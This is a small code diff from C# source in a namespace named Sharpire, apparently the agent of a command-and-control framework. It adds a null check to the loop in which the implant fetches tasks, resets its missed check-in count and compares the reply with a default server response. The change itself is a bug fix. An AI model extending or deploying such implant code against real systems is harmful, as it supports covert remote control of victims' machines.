@@ -132,7 +132,7 @@ namespace Sharpire
             }
 
             byte[] taskData = coms.GetTask();
-            if (taskData.Length > 0)
+            if (taskData != null && taskData.Length > 0)
             {
                 coms.MissedCheckins = 0;
                 if (Convert.ToBase64String(taskData) != sessionInfo.GetDefaultResponse())
